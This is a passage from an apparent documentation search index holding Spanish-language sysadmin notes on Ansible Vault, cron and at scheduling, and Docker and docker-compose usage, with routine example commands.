37653161366234386463313362623939313062643432626530616438343664303631343861333063 3838356238306265360a323631613637313762663732636339323961366639333633393565373062 30383061643634336266376633383334666363383739363562653133386663656131 # crear archivo normal y luego encryptarlo \u279c vim secreto2.yml \u279c cat secreto2.yml clave: miSecreto \u279c ansible-vault encrypt secreto2.yml New Vault password: Confirm New Vault password: Encryption successful \u279c cat secreto2.yml $ANSIBLE_VAULT ; 1 .1 ; AES256 30306137646336316235336264396364346666343364613363353961653632343536646561663332 3935396661623165663764663738386338353263393137310a643330326331333533323961326231 64333938313130613335633064346639313465666136356132313132353663313136643730306562 6238663564646264350a336566373939316231646333386661626531373962373234363361643637 37633861376132393265363566663236656337623864656666373133393562613631 # desencriptar archivo \u279c ansible-vault decrypt secreto2.yml Vault password: Decryption successful \u279c cat secreto2.yml clave: miSecreto bien, ahora creo un playbpook muy simple donde la variable clave es data sensible. yml - name: Prueba Vault hosts: localhost tasks: - debug: var=clave ```bash","title":"Vault"},{"location":"sistemas/automatizacion/ansible/#esta-es-una-simple-prueba-del-playbook","text":"ansible-playbook -e \"clave=prueba\" vault.yml ... TASK [debug] * * * ok: [localhost] => { \"clave\": \"prueba\" } ...","title":"esta es una simple prueba del playbook"},{"location":"sistemas/automatizacion/ansible/#anado-la-variable-en-el-archivo-encriptado-y-me-pregunta-clave-para-desencriptar","text":"ansible-playbook -e \"@secreto.yml\" --ask-vault-pass vault.yml Vault password: ... TASK [debug] * * * ok: [localhost] => { \"clave\": \"superSecreto\" } ...","title":"a\u00f1ado la variable en el archivo encriptado y me pregunta clave para desencriptar"},{"location":"sistemas/automatizacion/ansible/#anado-la-variable-en-el-archivo-encriptado-y-coje-la-clave-para-desencriptar-del-archivo-pass","text":"\u279c ansible vim .pass \u279c ansible ansible-playbook -e \"@secreto.yml\" --vault-password-file=.pass playbooks/vault.yml ... TASK [debug] * * * ok: [localhost] => { \"clave\": \"superSecreto\" } ... ```","title":"a\u00f1ado la variable en el archivo encriptado y coje la clave para desencriptar del archivo .pass"},{"location":"sistemas/automatizacion/tareas_programadas/","text":"Tareas Programadas Cron Administrador de tareas Se utiliza para reproducir un script en un momento concreto , entre otras cosas. Su carpeta se encuentra en: Fichero: /etc/crontab (ah\u00ed guardaremos los scripts) Tabla de referencia imaginaria para el comando. Minutos Horas D\u00eda del mes Mes D\u00eda semana 01 * * * * Ejecutar cada minuto 1 de cada hora de cada d\u00eda del mes, mes y d\u00eda de la semana. */5 * * * * Ejecutar cada 5 minutos. 15 20 * * * Ejecutar a las 20:15 horas de cada d\u00eda, mes, etc.. 45 19 1 * * Ejecutar cada 1er d\u00eda del mes a las 19:45 30 * 10 - 25 * 6 - 7 Ejecutar cada 30m de cada hora los d\u00edas del 10 al 25 todos los meses s\u00e1bados y domingos 00 18 - 20 25 3 - 7 1,3,6 Ejecutar cada hora entre las 18:00 y 20:00 el d\u00eda 25 del mes entre marzo y julio si es lunes(1), mi\u00e9rcoles(3) o s\u00e1bado(6). Los guiones marcan rangos y las comas para n\u00fameros espec\u00edficos. Comando: 15 20 * * * \u201cuser\u201d \u201cruta absoluta del script\u201d (Importante) Respetar los espacios, user y ruta no llevan asteriscos\u201d\u201d. Tabla de referencia imaginaria para el comando. # Example of job definition: # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user-name command to be executed Ejemplos | Minutos | Horas | D\u00eda del mes | Mes | D\u00eda semana | #Ejecutar cada minuto 1 de cada hora de cada d\u00eda del mes, mes y d\u00eda de la semana. 01 * * * * #Ejecutar cada 5 minutos. */5 * * * * #Ejecutar a las 20:15 horas de cada d\u00eda, mes, etc.. 15 20 * * * #Ejecutar cada 1er d\u00eda del mes a las 19:45 45 19 1 * * #Ejecutar cada 30m de cada hora los d\u00edas del 10 al 25 todos los meses s\u00e1bados y domingos 30 * 10 -25 * 6 -7 #Ejecutar cada hora entre las 18:00 y 20:00 el d\u00eda 25 del mes entre marzo y julio si es lunes(1), mi\u00e9rcoles(3) o s\u00e1bado(6). 00 18 -20 25 3 -7 1 ,3,6 #viernes 12:15 de la noche 15 00 * * 6 crontab -l crontab -e crontab -r \u25a0 ~ sudo cat /var/spool/cron/isx47787241 crontab fichero At at programa tareas a una hora y dia determinados, esta tarea se ejecutara siempre que el pc este encendido en la fecha indicada, de no ser as\u00ed se perder\u00e1 la tarea. Dentro del directorio /var/spool/at/ crea un fichero con cada una de las tareas por hacer. ejemplos ver tareas adjudicadas atq borrar una tarea del at programada atrm 3 Ejecutar un script a una hora determinada at -f backup.sh 10 :22 Programa una tarea para dentro de 5 minutos que elimine de un directorio todos los ficheros con extensi\u00f3n .tmp . at now +5 minutes find /tmp/ -name *.tmp -exec rm {} \\; Programa una tarea con at a las 17:00 de hoy para que elimine los ficheros del directorio descargas de tu sistema. at 17:00 sudo find /tmp/descargas/* -exec rm {} \\; Denegar a un usuario utilizar at echo \"user\" >> /etc/at.deny at 11 :00 You do not have permission to use at. Diferentes formatos de usar at formato HH:MM at 11 :00 # proramas a una hora especifica midnight at midnight # se ejecuta a media noche 00:00 noon at moon # medio d\u00eda 12:00 teatime at 4pm 0 am # formato 12 horas formato del nombre-mes, d\u00eda y a\u00f1o at -v jan 30 2018 Tue Jan 30 10 :40:00 2018 formato MMDDYY, MM/DD/YY, o MM.DD.YY at -v 12 /10/2017 Sun Dec 10 10 :42:00 2017 at -v 12102017 Sun Dec 10 10 :44:00 2017 now + time at -v now + 5 days Wed Dec 6 10 :46:00 2017 t -v now + 60 minutes Fri Dec 1 11 :47:00 2017 at -v 2 :30 PM 21 .10.20 Wed Oct 21 14 :30:00 2020 Crea un script que abra un nuevo terminal dentro de 5 minutos. at -v now +5 minutes Fri Dec 1 11 :13:00 2017 at> export DISPLAY = :0 at> gnome-terminal Programa una tarea que muestre la fecha ma\u00f1ana y 5 minutos . at -v tomorrow +5 minutes date >> /dev/pts/0 Batch batch permite no cargar el systema en caso de que este por encima de un porcentaje concreto. Aunque at le diga que ejecute el script batch esperara a ejecutar este mismo hasta que el systema este por debajo del porcentaje indicado. En el siguiente ejemplo le indicamos a batch que se ejecute cuando el systema est\u00e9 por debajo del 10% y en un intervalo entre script y script de 60 segundos atd -l 0 .1 # cambiar nivel de carga de batch atd -b 60 # n\u00famero de segundos que tardar\u00e1 en ejecutar entre tareas segundos Ejemplo Ejecutar un script en 5 minutos at now +5 minutes warning: commands will be executed using /bin/sh at> batch -f script","title":"Tareas Programadas"},{"location":"sistemas/automatizacion/tareas_programadas/#tareas-programadas","text":"","title":"Tareas Programadas"},{"location":"sistemas/automatizacion/tareas_programadas/#cron","text":"Administrador de tareas Se utiliza para reproducir un script en un momento concreto , entre otras cosas. Su carpeta se encuentra en: Fichero: /etc/crontab (ah\u00ed guardaremos los scripts) Tabla de referencia imaginaria para el comando. Minutos Horas D\u00eda del mes Mes D\u00eda semana 01 * * * * Ejecutar cada minuto 1 de cada hora de cada d\u00eda del mes, mes y d\u00eda de la semana. */5 * * * * Ejecutar cada 5 minutos. 15 20 * * * Ejecutar a las 20:15 horas de cada d\u00eda, mes, etc.. 45 19 1 * * Ejecutar cada 1er d\u00eda del mes a las 19:45 30 * 10 - 25 * 6 - 7 Ejecutar cada 30m de cada hora los d\u00edas del 10 al 25 todos los meses s\u00e1bados y domingos 00 18 - 20 25 3 - 7 1,3,6 Ejecutar cada hora entre las 18:00 y 20:00 el d\u00eda 25 del mes entre marzo y julio si es lunes(1), mi\u00e9rcoles(3) o s\u00e1bado(6). Los guiones marcan rangos y las comas para n\u00fameros espec\u00edficos. Comando: 15 20 * * * \u201cuser\u201d \u201cruta absoluta del script\u201d (Importante) Respetar los espacios, user y ruta no llevan asteriscos\u201d\u201d. Tabla de referencia imaginaria para el comando. # Example of job definition: # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user-name command to be executed Ejemplos | Minutos | Horas | D\u00eda del mes | Mes | D\u00eda semana | #Ejecutar cada minuto 1 de cada hora de cada d\u00eda del mes, mes y d\u00eda de la semana. 01 * * * * #Ejecutar cada 5 minutos. */5 * * * * #Ejecutar a las 20:15 horas de cada d\u00eda, mes, etc.. 15 20 * * * #Ejecutar cada 1er d\u00eda del mes a las 19:45 45 19 1 * * #Ejecutar cada 30m de cada hora los d\u00edas del 10 al 25 todos los meses s\u00e1bados y domingos 30 * 10 -25 * 6 -7 #Ejecutar cada hora entre las 18:00 y 20:00 el d\u00eda 25 del mes entre marzo y julio si es lunes(1), mi\u00e9rcoles(3) o s\u00e1bado(6). 00 18 -20 25 3 -7 1 ,3,6 #viernes 12:15 de la noche 15 00 * * 6 crontab -l crontab -e crontab -r \u25a0 ~ sudo cat /var/spool/cron/isx47787241 crontab fichero","title":"Cron"},{"location":"sistemas/automatizacion/tareas_programadas/#at","text":"at programa tareas a una hora y dia determinados, esta tarea se ejecutara siempre que el pc este encendido en la fecha indicada, de no ser as\u00ed se perder\u00e1 la tarea. Dentro del directorio /var/spool/at/ crea un fichero con cada una de las tareas por hacer.","title":"At"},{"location":"sistemas/automatizacion/tareas_programadas/#ejemplos","text":"ver tareas adjudicadas atq borrar una tarea del at programada atrm 3 Ejecutar un script a una hora determinada at -f backup.sh 10 :22 Programa una tarea para dentro de 5 minutos que elimine de un directorio todos los ficheros con extensi\u00f3n .tmp . at now +5 minutes find /tmp/ -name *.tmp -exec rm {} \\; Programa una tarea con at a las 17:00 de hoy para que elimine los ficheros del directorio descargas de tu sistema. at 17:00 sudo find /tmp/descargas/* -exec rm {} \\; Denegar a un usuario utilizar at echo \"user\" >> /etc/at.deny at 11 :00 You do not have permission to use at. Diferentes formatos de usar at formato HH:MM at 11 :00 # proramas a una hora especifica midnight at midnight # se ejecuta a media noche 00:00 noon at moon # medio d\u00eda 12:00 teatime at 4pm 0 am # formato 12 horas formato del nombre-mes, d\u00eda y a\u00f1o at -v jan 30 2018 Tue Jan 30 10 :40:00 2018 formato MMDDYY, MM/DD/YY, o MM.DD.YY at -v 12 /10/2017 Sun Dec 10 10 :42:00 2017 at -v 12102017 Sun Dec 10 10 :44:00 2017 now + time at -v now + 5 days Wed Dec 6 10 :46:00 2017 t -v now + 60 minutes Fri Dec 1 11 :47:00 2017 at -v 2 :30 PM 21 .10.20 Wed Oct 21 14 :30:00 2020 Crea un script que abra un nuevo terminal dentro de 5 minutos. at -v now +5 minutes Fri Dec 1 11 :13:00 2017 at> export DISPLAY = :0 at> gnome-terminal Programa una tarea que muestre la fecha ma\u00f1ana y 5 minutos . at -v tomorrow +5 minutes date >> /dev/pts/0","title":"ejemplos"},{"location":"sistemas/automatizacion/tareas_programadas/#batch","text":"batch permite no cargar el systema en caso de que este por encima de un porcentaje concreto. Aunque at le diga que ejecute el script batch esperara a ejecutar este mismo hasta que el systema este por debajo del porcentaje indicado. En el siguiente ejemplo le indicamos a batch que se ejecute cuando el systema est\u00e9 por debajo del 10% y en un intervalo entre script y script de 60 segundos atd -l 0 .1 # cambiar nivel de carga de batch atd -b 60 # n\u00famero de segundos que tardar\u00e1 en ejecutar entre tareas segundos","title":"Batch"},{"location":"sistemas/automatizacion/tareas_programadas/#ejemplo","text":"Ejecutar un script en 5 minutos at now +5 minutes warning: commands will be executed using /bin/sh at> batch -f script","title":"Ejemplo"},{"location":"virtualizacion/Docker-basico/","text":"Docker Instalar Debian y raspbian. Para otras distros mirar el enlace. https://docs.docker.com/install/linux/docker-ce/debian/#set-up-the-repository sudo apt-get update # dependencias necesarias sudo apt-get install \\ apt-transport-https \\ ca-certificates \\ curl \\ gnupg2 \\ software-properties-common # a\u00f1adir clave oficial del repositorio curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add - debian # a\u00f1adir repositorio sudo add-apt-repository \\ \"deb [arch=amd64] https://download.docker.com/linux/debian \\ $( lsb_release -cs ) \\ stable\" raspbian # a\u00f1adir repositorio echo \"deb [arch=armhf] https://download.docker.com/linux/debian \\ $( lsb_release -cs ) stable\" | \\ sudo tee /etc/apt/sources.list.d/docker.list # instalar docker y docker compose sudo apt-get update sudo apt-get install docker-ce docker-compose A\u00f1adir usuario al grupo docker sudo usermod -aG docker $( whoami ) Comandos b\u00e1sicos Visualizaci\u00f3n # contenedores docker ps # ver contenedores en ejecucion docker ps -a # Todos los contenedores docker inspect docker-nginx # informacion del contenedor docker network inspect joomla_default # informacion de la red del contenedor docker stats contenedor # ver gasto del contenedor, mem, cpu, net. docker logs -f contenedor # logs # imagenes docker images # ver imagenes docker search nginx # buscar imagenes de https://hub.docker.com/r/library/ docker pull nginx # descargar imagen docker pull docker.io/nginx # descargar imagen docker history -H apache-centos # informacion delas capas de la imagen, run, cmd, etc... # volumenes docker volume ls # listar volumenes docker volume ls -f dangling = true # listar volumenes hu\u00e9rfanos Acciones docker rmi imagen # borrar imagen docker rm contenedor # borrar contenedor docker rm -f contenedor # borrar contenedor en marcha docker rm -fv contenedor # borrar contenedor con sus volumenes docker start docker-nginx # arrancar contenedor ( tiene que estar creado ) docker stop docker-nginx # para contenedor docker restart docker-nginx # reiniciar contenedor docker pause docker-nginx # pausar docker unpause docker-nginx # despausar docker rename old-nombre new-nombre # renombrar contenedor docker volume rm # borrar volumen docker create volume my-volume # crear volumen docker build -t nombre-conenedor . # crear imagen con dockfile docker attach docker-nginx # acceder a contenedor (si est\u00e1 en marcha) docker exec -i -t docker-nginx /bin/bash # acceder a un contenedor o mandar orden Limpieza docker images -f dangling = true # ver im\u00e1genes hu\u00e9rfanas docker images -f dangling = true -q | xargs docker rmi # eliminar im\u00e1genes hu\u00e9rfanas docker rm $( docker ps -a -q ) # borrar todos los contenedores docker rmi $( docker images -q ) # borrar todas las imagenes Dockerfile Dockerfile es un archivo de texto donde introducimos la configuraci\u00f3n para crear im\u00e1genes docker. docker build -t nombre-conenedor . La sintaxis de configuraci\u00f3n m\u00ednima es la siguiente. FROM centos RUN yum install httpd -y CMD apachectl -DFOREGROUND from imagen base donde correr run ordenes a ejecutar, actualizaciones , instalaciones, etc... cmd activaci\u00f3n del servicio en primer plano. Contenido FROM # imagen base RUN # ejecucion de ordenes COPY/ADD # copiar archivos locales dentro de la imagen ENV # definir variables de entorno que utilizaras en la creaci\u00f3n de la imagen WORKDIR # moverse a un directorio de trabajo ( un cd ) EXPOSE # exponer puertos LABEL # etiquetas a a\u00f1adir, version, autor, descripci\u00f3n, etc.. USER # cabiar de usuario, ( tiene que existir ) VOLUME # Punto de montage anonimo CMD # ejecucion de servicio, o script final COPY/ADD : hacen pr\u00e1cticamente lo mismo, la diferencia es que ADD permite descargar los archivos desde una url, sin tener que tenerlos localmente. .dockerignore es un archivo de texto plano donde le indicamos que directorios o archivos ignorar cuando creamos una imagen con docker build . Buenas practicas Respecto a la creaci\u00f3n de archivos dockerfile hay unas normas sociales de construcci\u00f3n. El Dockerfile tiene que ser: Ef\u00edmero: se tiene que poder destruir con facilidad. Un servicio por contenedor, siempre que sea posible. M\u00ednimo peso posible, y no agregar paquetes innecesarios. Buena legibilidad usar multil\u00ednea \\ si es necesario. A\u00f1adir labels, autor, versi\u00f3n, descripci\u00f3n. Multi Stage Build Multi stage build es una forma de ahorrar espacio en una imagen, copiando contenido de una imagen a otra. En este ejemplo creare un app en una imagen esta generar\u00e1 contenido adicional que no quiero tener, por lo tanto copiare la app compilada en otra imagen para ahorrar espacio. FROM maven:3.5-alpine as builder COPY app /app RUN cd /app && mvn package FROM openjdk:8-alpine COPY --from = builder /app/target/my-app-1.0-SNAPSHOT.jar /opt/app.jar CMD java -jar /opt/app.jar debian \u279c docker build -t multi-stage . REPOSITORY TAG IMAGE ID CREATED SIZE multi-stage latest 3051e85589f3 21 seconds ago 105MB <none> <none> 6b149ba281fe 37 seconds ago 131MB openjdk 8 -alpine e9ea51023687 2 days ago 105MB maven 3 .5-alpine fb4bb0d89941 4 months ago 119MB Explicaci\u00f3n de todo esto. Obviamente tenemos las im\u00e1genes oficiales de maven, y openjdk que hemos utilizado de base. Despu\u00e9s tenemos la 2\u00aa l\u00ednea una imagen hu\u00e9rfana, que es la utilizada para compilar la app, podemos ver que se a inflado 11MB en dependencias de su base maven. Por ultimo tenemos la imagen multi-stage donde hemos copiado la app compilada, por lo tanto podr\u00edamos borrar todas las dem\u00e1s im\u00e1genes y ahorrar ese espacio de mas que no necesitamos de nada. Contenedores Los contenedores se crean a partir de una imagen y son los encargados de mantener activos los servicios. --name nombre-contenedor -p 8000 :80 # exponer puerto 8000 puerto local 80 puerto contenedor -v ./path/local:/path/to/image # punto de montage comun --volume=host-dir:container-dir:options -it centos /bin/bash # tty interactive -e \"prueba1=1234\" # a\u00f1adir variable de entorno -cp archivo contenedor:ruta # copiar archivo dentro de un contenedor --rm -it # genera contenedores temporales, una vez sales de la onsola se elimina # limitar recursos -m \"500mb\" # limitar MiB de memoria ue puede usar --cpuset-cpus 0 -1 # numeros de cpu permito usar Sintaxis: # nombre contenedor puertos nombre de imagen docker run --name docker-nginx -p 8000 :80 nginx Ejemplos crear contenedores # contendor interactivo, puedes acceder a el docker run -dti --name centos1 centos # Crear contenedor con directorio local montado en contenedor docker run --name docker-nginx -p 8000 :80 -v ~/docker-nginx/html:/usr/share/nginx/html nginx # contenedor con red especifica docker run -dti --name centos3 --network test1 centos # contenedor con red e ip concreta, solo podras asignar ip si es una subred docker run -dti --name centos3 --network test1 --ip 172 .30.0.10 centos Acceder a un contenedor docker exec -ti docker-nginx /bin/bash # acceder a un contenedor docker exec -u root -ti docker-nginx /bin/bash # acceder a un contenedor con user esec\u00edfico Generar imagen desde un contenedor docker commit --change = 'CMD [\"apache2ctl\", \" -D FOREGROUND\"]' -c \"EXPOSE 80\" nueva-imagen-apache no es necesario sobreescribir el CMD aun que es recomendable. Volumenes Un volumen es un punto de montage desde un contenedor a nuestro host. xisten diferentes tipo de volumenes. Host: Volumen host es el mas \u00fatil y facil de utilizar -v /path/host:path/container de esta manera todo lo que se crea en el directorio del contenedor montado, se respalda en el host. Anonimo: volumnen anonimo es lo mismo pero crea ese punto de montage en el directorio volmes de docker, por defecto /var/lib/docker/volumes , el problema de este es que crea un directorio con un nombre de x digitos y es poco amigable de trabajar con el e identificarlo. utilizaci\u00f3n -v /path/container Al crear un volumen en Dockerfile se crea como anonimo. Nombrado: volumen nombrado es un punto de montage con un volumen creado con anterioridad. Estos volumenes se crean en /var/lib/docker/volumes , a diferencia de los anonimos estos se crean con un nombre especifico. ```bash docker volume create my-volumen ls /var/lib/docker/volumes my-volumen docker run -d --name nginx-web -p 80:80 -v my-volumen:/var/www/html nginx ``` Redes La red por defecto al instalar docker es docker0 , crea una red virtual en modo bridge donde todos los contenedores por defecto se conectaran a ella. En ocasiones quremos que diversos servicios no esten en la misma red, para ello podemos crear diferentes redes o subredes para aislarlos. Tios de red: Bridge: Es una red virtual dentro de nuestra red de host, donde crea un puente para salir al exterior mediante la ip de host local. ( red default de los contenedores ) Host: El contenedor utilizara la misma ip que el servidor real, red eth0 o la que tenga el dispositivo, incluso hostname. None: Se utiliza para indicar que el contenedor no tiene red asignada. Overlay: docker network ls # listar redes docker network inspect nombre-red # iformaci\u00f3n de la red docker network create test-network # crear nueva red por defecto bridge docker run -dti --network test-network --name test1 centos # crear contenedor con una red concreta docker run -dti --network host --name test2 centos # crear contenedor con red local: ip, hostname, interfaces. docker run -dti --network none --name test3 centos # contenedor sin red # para crear un contenedor con una ip concreta, primero a de crearse una subred docker network create -d bridge --subnet 172 .124.10.0./24 --gateway 172 .124.10.1 nueva-subred # crear subred docker run -dti --name centos3 --network test1 --ip 172 .30.0.10 centos # crear contenedo con ip especifica docker network connect red-a-conectar contenedor # a\u00f1adir red a contenedor docker network disconnect red-a-conectar contenedor # eliminar red de contenedor docker network rm red # eliminar red creada, no tiene que estar utilizada por ningun contenedor docker network prune # eliminasr redes en desuso docker run -d -p 127 .0.0.1:8081:80 nginx \u200b Subir imagen a dockerhub docker login docker commit nombre-container nombre-nueva-imagen docker commit lunch_mirie mychispas docker tag mychispas:latest jorgepastorr/mychispas:latest docker push jorgepastorr/mychispas:latest ver imagenes en el repositorio remoto docker search jorgepastorr Entrypoints entripoint permite tratar un contenedor como un script, de esta manera se puede asignar argumentos a el arranque de un contenedor. si un Dockerfile comparte entrypoint con cmd el cmp se sumara como argumento al entripoint FROM ubuntu ENTRYPOINT [ \"top\" , \"-b\" ] CMD [ \"-c\" ] $ docker exec -it test ps aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 2 .6 0 .1 19752 2352 ? Ss+ 08 :24 0 :00 top -b -c En cambio si desde la linea de comandos al arrncar el docker especifico un argumento el cmd se anula docker run -it --rm --name test top -H $ docker exec -it test ps aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 2 .6 0 .1 19752 2352 ? Ss+ 08 :24 0 :00 top -b -H Se puede sobreescrivir el entripoint manualmente desde linea de comandos docker run --rm --entrypoint /usr/bin/cal -it test el 0.0.0.0 significa que en todas las interficies de red del host esta escuchando por el puerto 389 ldap.edt.org /bin/sh -c /opt/docker/sta ... Up 0 .0.0.0:389->389/tcp docker-compose Instalar web oficial docker compose sudo curl -L \"https://github.com/docker/compose/releases/download/1.23.2/docker-compose- $( uname -s ) - $( uname -m ) \" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose documentacion oficial compose Desplegar docker compose docker-compose up -d # crear, actualizar contenedor docker-compose -p webtest up -d # ombrar proyecto, red sera webtest-default docker-compose -f docker-compose-nginx.yml up -d # desplegar en nombre archivo distinto docker-compose build # crear imagen docker-compose logs -f # ver logs de los contenedores corriendo docker compose <Enter> # todas las opciones docker-compose down # eliminar contenedor docker-compose pause ldap # parar container docker-compose unpause ldap # pausar container docker-compose stop ldap docker-compose start ldap docker-compose ps docker-compose top ldap docker-compose images Estructura Estructura b\u00e1sica version : '3' services : web : image : nginx container_name : nginx ports : - \"80:80\" Variables de entorno Se pueden definir en el mismo yaml o en un archivo externo que recogemos. environment : - RACK_ENV=development - SHOW=true - SESSION_SECRET env_file : .env env_file : - ./common.env - ./apps/web.env - /opt/secrets.env Volumenes Nombrados Estos volumenes por defecto se crean nen /var/lib/docker/volumes version : '3' services : web : image : nginx container_name : nginx ports : - \"80:80\" volumes : - \"vol2:/usr/share/nginx/html\" volumes : vol2 : Host Se a\u00f1ade ruta relativa o absoluta donde se quiere que se cree el volumen version : '3' services : web : image : nginx container_name : nginx ports : - \"80:80\" volumes : - \"./html:/usr/share/nginx/html\" Redes-Compose Las redes dentro de compose sirve para crear uno o varios contenedores dentro de una red especifica. version : '3' services : web : image : nginx container_name : nginx ports : - \"80:80\" networks : - net-test networks : net-test : Crear imagen build indica donde se encuentra el Dockerfile que tiene que fabricar. En este ejemplo, primero fabricara una imagen nombrada web-centos y luego creara un contenedor web-centos version : '3' services : web : image : web-centos build : . command : python -m SimpleHTTPServer 8080 container_name : web-centos ports : - \"8080:8080\" docker-compose up --build -d Sobreescribir CMD En ocasiones queremos sobreescribir el cmd de una imagen, en el siguiente ejemplo vemos como una imagen centos que su cmd por defecto es /bin/bash , ahora es una instrucci\u00f3n de python. version : '3' services : web : image : centos command : python -m SimpleHTTPServer 8080 ports : - \"8080:8080\" CONTAINER ID IMAGE COMMAND f4e99be647702b web-centos \"python -m SimpleHTTPServer 8080\" Politica reinincio no : si el contenedor se apaga por alguna razon, no se reiniciara. ( por defecto ) on-failure : si el contenedor se a caido por alg\u00fan error se reiniciara. unless-stopped : cada vez que el contenedor se apage o caiga se reiniciara, a no ser que lo apages manualmente. always : cada vez que el contenedor se apage o caiga se reiniciara version : '3' services : web : image : nginx container_name : nginx ports : - \"80:80\" restart : always M\u00faltiples servicios la gracia de compose es desplegar multiples servicios de golpe, en el siguiente ejemplo se ve como e ejecuta joomla junto con mysql en una red conjunta. version : '3' services : db : container_name : joomla-db image : mysql:5.7 volumes : - $PWD/data:/var/lib/mysql environment : MYSQL_ROOT_PASSWORD : example MYSQL_USER : joomla MYSQL_DATABASE : joomla MYSQL_PASSWORD : joomla networks : - my_net web : container_name : joomla-web image : joomla depends_on : - db volumes : - $PWD/html:/var/www/html ports : - 80:80 environment : JOOMLA_DB_HOST : db JOOMLA_DB_PASSWORD : joomla JOOMLA_DB_USER : joomla JOOMLA_DB_NAME : joomla networks : - my_net networks : my_net : DockerHub docker login # logearse Obviamente hay que tener una cuenta. Cambiar de nombre a una imagen y subir docker tag mi-debian-imagen jorgepastorr/debian-update # por ejemplo docker push jorgepastorr/debian-update # subir la imagen","title":"Docker"},{"location":"virtualizacion/Docker-basico/#docker","text":"","title":"Docker"},{"location":"virtualizacion/Docker-basico/#instalar","text":"Debian y raspbian. Para otras distros mirar el enlace. https://docs.docker.com/install/linux/docker-ce/debian/#set-up-the-repository sudo apt-get update # dependencias necesarias sudo apt-get install \\ apt-transport-https \\ ca-certificates \\ curl \\ gnupg2 \\ software-properties-common # a\u00f1adir clave oficial del repositorio curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -","title":"Instalar"},{"location":"virtualizacion/Docker-basico/#debian","text":"# a\u00f1adir repositorio sudo add-apt-repository \\ \"deb [arch=amd64] https://download.docker.com/linux/debian \\ $( lsb_release -cs ) \\ stable\"","title":"debian"},{"location":"virtualizacion/Docker-basico/#raspbian","text":"# a\u00f1adir repositorio echo \"deb [arch=armhf] https://download.docker.com/linux/debian \\ $( lsb_release -cs ) stable\" | \\ sudo tee /etc/apt/sources.list.d/docker.list # instalar docker y docker compose sudo apt-get update sudo apt-get install docker-ce docker-compose A\u00f1adir usuario al grupo docker sudo usermod -aG docker $( whoami )","title":"raspbian"},{"location":"virtualizacion/Docker-basico/#comandos-basicos","text":"","title":"Comandos b\u00e1sicos"},{"location":"virtualizacion/Docker-basico/#visualizacion","text":"# contenedores docker ps # ver contenedores en ejecucion docker ps -a # Todos los contenedores docker inspect docker-nginx # informacion del contenedor docker network inspect joomla_default # informacion de la red del contenedor docker stats contenedor # ver gasto del contenedor, mem, cpu, net. docker logs -f contenedor # logs # imagenes docker images # ver imagenes docker search nginx # buscar imagenes de https://hub.docker.com/r/library/ docker pull nginx # descargar imagen docker pull docker.io/nginx # descargar imagen docker history -H apache-centos # informacion delas capas de la imagen, run, cmd, etc... # volumenes docker volume ls # listar volumenes docker volume ls -f dangling = true # listar volumenes hu\u00e9rfanos","title":"Visualizaci\u00f3n"},{"location":"virtualizacion/Docker-basico/#acciones","text":"docker rmi imagen # borrar imagen docker rm contenedor # borrar contenedor docker rm -f contenedor # borrar contenedor en marcha docker rm -fv contenedor # borrar contenedor con sus volumenes docker start docker-nginx # arrancar contenedor ( tiene que estar creado ) docker stop docker-nginx # para contenedor docker restart docker-nginx # reiniciar contenedor docker pause docker-nginx # pausar docker unpause docker-nginx # despausar docker rename old-nombre new-nombre # renombrar contenedor docker volume rm # borrar volumen docker create volume my-volume # crear volumen docker build -t nombre-conenedor . # crear imagen con dockfile docker attach docker-nginx # acceder a contenedor (si est\u00e1 en marcha) docker exec -i -t docker-nginx /bin/bash # acceder a un contenedor o mandar orden","title":"Acciones"},{"location":"virtualizacion/Docker-basico/#limpieza","text":"docker images -f dangling = true # ver im\u00e1genes hu\u00e9rfanas docker images -f dangling = true -q | xargs docker rmi # eliminar im\u00e1genes hu\u00e9rfanas docker rm $( docker ps -a -q ) # borrar todos los contenedores docker rmi $( docker images -q ) # borrar todas las imagenes","title":"Limpieza"},{"location":"virtualizacion/Docker-basico/#dockerfile","text":"Dockerfile es un archivo de texto donde introducimos la configuraci\u00f3n para crear im\u00e1genes docker. docker build -t nombre-conenedor . La sintaxis de configuraci\u00f3n m\u00ednima es la siguiente. FROM centos RUN yum install httpd -y CMD apachectl -DFOREGROUND from imagen base donde correr run ordenes a ejecutar, actualizaciones , instalaciones, etc... cmd activaci\u00f3n del servicio en primer plano.","title":"Dockerfile"},{"location":"virtualizacion/Docker-basico/#contenido","text":"FROM # imagen base RUN # ejecucion de ordenes COPY/ADD # copiar archivos locales dentro de la imagen ENV # definir variables de entorno que utilizaras en la creaci\u00f3n de la imagen WORKDIR # moverse a un directorio de trabajo ( un cd ) EXPOSE # exponer puertos LABEL # etiquetas a a\u00f1adir, version, autor, descripci\u00f3n, etc.. USER # cabiar de usuario, ( tiene que existir ) VOLUME # Punto de montage anonimo CMD # ejecucion de servicio, o script final COPY/ADD : hacen pr\u00e1cticamente lo mismo, la diferencia es que ADD permite descargar los archivos desde una url, sin tener que tenerlos localmente. .dockerignore es un archivo de texto plano donde le indicamos que directorios o archivos ignorar cuando creamos una imagen con docker build .","title":"Contenido"},{"location":"virtualizacion/Docker-basico/#buenas-practicas","text":"Respecto a la creaci\u00f3n de archivos dockerfile hay unas normas sociales de construcci\u00f3n. El Dockerfile tiene que ser: Ef\u00edmero: se tiene que poder destruir con facilidad. Un servicio por contenedor, siempre que sea posible. M\u00ednimo peso posible, y no agregar paquetes innecesarios. Buena legibilidad usar multil\u00ednea \\ si es necesario. A\u00f1adir labels, autor, versi\u00f3n, descripci\u00f3n.","title":"Buenas practicas"},{"location":"virtualizacion/Docker-basico/#multi-stage-build","text":"Multi stage build es una forma de ahorrar espacio en una imagen, copiando contenido de una imagen a otra. En este ejemplo creare un app en una imagen esta generar\u00e1 contenido adicional que no quiero tener, por lo tanto copiare la app compilada en otra imagen para ahorrar espacio. FROM maven:3.5-alpine as builder COPY app /app 